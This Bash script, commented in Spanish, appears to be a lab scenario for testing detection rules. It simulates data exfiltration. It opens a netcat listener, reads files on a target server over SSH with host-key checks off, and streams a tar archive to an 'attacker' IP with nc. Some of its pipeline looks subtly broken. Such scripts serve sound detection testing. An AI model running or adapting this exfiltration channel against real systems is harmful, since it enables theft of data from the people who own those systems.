#!/bin/bash
# E4 - Exfiltración de datos (muestra representativa, no dataset completo)
# Transfiere solo 5MB para demostrar el canal de exfiltración

set -uo pipefail
LOG=/var/log/lab/runner.jsonl
mkdir -p "$(dirname $LOG)"

log_event() {
    ts=$(date -u +%s%N)
    echo "{\"ts\":$ts,\"scenario\":\"E4\",\"event\":\"$1\"$([ -n "${2:-}" ] && echo ",\"data\":\"$2\"")}" | tee -a "$LOG"
}

TARGET_HOST="${TARGET_HOST:-fileserver}"
TARGET_USER="${TARGET_USER:-lab}"
TARGET_DIR="${TARGET_DIR:-/opt/labprueba}"
ATTACKER_IP="${ATTACKER_IP:-172.20.0.30}"
LISTENER_PORT="${LISTENER_PORT:-4444}"
SAMPLE_FILES=50   # Solo 50 ficheros (~10MB) en lugar de 500

log_event "start"

# Paso 1: preparar listener en el atacante (timeout de 30s)
mkdir -p /lab/stolen
log_event "step1_listener_start" "port=$LISTENER_PORT"
timeout 30 nc -l -p $LISTENER_PORT > /lab/stolen/exfil_$(date +%s).tar.gz &
NC_PID=$!
sleep 1

# Paso 2: empaquetar MUESTRA y enviar (dispara 100231 y 100230)
log_event "step2_exfil_command"
ssh -o StrictHostKeyChecking=no \
    ${TARGET_USER}@${TARGET_HOST} \
    "ls ${TARGET_DIR} | head -${SAMPLE_FILES} | \
     xargs -I{} -P1 sh -c 'cat ${TARGET_DIR}/{}' | \
     tar czf - -T - 2>/dev/null | \
     timeout 25 nc ${ATTACKER_IP} ${LISTENER_PORT}" \
    2>/dev/null || true

# Espera breve para completar la transferencia
sleep 3
kill $NC_PID 2>/dev/null || true

# Verificar tamaño exfiltrado
SIZE=$(du -sb /lab/stolen/ 2>/dev/null | awk '{print $1}' || echo "0")
log_event "step3_exfil_complete" "size=$SIZE"
log_event "end"
